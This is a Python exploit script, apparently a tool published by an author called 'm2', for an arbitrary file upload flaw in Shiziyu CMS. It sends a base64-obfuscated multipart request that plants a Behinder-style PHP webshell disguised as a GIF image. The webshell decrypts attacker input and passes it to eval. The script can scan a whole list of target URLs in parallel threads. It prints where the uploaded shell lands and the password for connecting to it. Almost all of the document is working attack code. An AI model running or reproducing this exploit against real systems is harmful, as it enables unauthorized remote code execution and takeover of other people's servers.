import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

#poc
def check_vuln(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc
	vuln_url = url.scheme + '://' + url.netloc + '/wxapp.php?controller=Goods.doPageUpload'
	headers = {
		'User-Agent': get_ua(),
		'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs',
	}
	data=base64.b64decode("LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5OFVhQU5tV0FnTTRCcUJTcwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwZmlsZSI7IGZpbGVuYW1lPSJuZXc1LnBocCIKQ29udGVudC1UeXBlOiBpbWFnZS9naWYKCjw/cGhwCkBlcnJvcl9yZXBvcnRpbmcoMCk7CnNlc3Npb25fc3RhcnQoKTsKICAgICRrZXk9ImQyYWMwOGM2NGI1ZGIzOGEiOwoJJF9TRVNTSU9OWydrJ109JGtleTsKCXNlc3Npb25fd3JpdGVfY2xvc2UoKTsKCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOwoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkKCXsKCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7CgkJJHBvc3Q9JHQoJHBvc3QuIiIpOwoJCQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyAKICAgIAkJCX0KCX0KCWVsc2UKCXsKCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsKCX0KICAgICRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOwogICAgJGZ1bmM9JGFyclswXTsKICAgICRwYXJhbXM9JGFyclsxXTsKCWNsYXNzIEN7cHVibGljIGZ1bmN0aW9uIF9faW52b2tlKCRwKSB7ZXZhbCgkcC4iIik7fX0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOwo/PgoKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeThVYUFObVdBZ000QnFCU3MtLQ==")
	try:
		res = requests.post(vuln_url,headers=headers,data=data,timeout=10,verify=False)
		if res.status_code==200 and '"code":0' in res.text:
			resp=res.json()
			webshell_path=resp.get('image_o')
			print("\033[32m[+]%s file upload success!\nwebshell_path:%s\033[0m" %(url1,webshell_path))
		else:
			print("\033[31m[-]%s file upload False!\033[0m" %url1)
	except Exception as e:
		print("\033[31m[-]%s is timeout\033[0m" %url1)


#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''

	狮子鱼cms任意文件上传漏洞
	                                                                    
                              upload_rce_exp By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='upload_rce_exp By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	print('[*]任务开始...')
	print('[*]webshell使用冰蝎3连接，密码：m2orz')
	if url != None and filename == None:
		check_vuln(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时%d' %(end-start))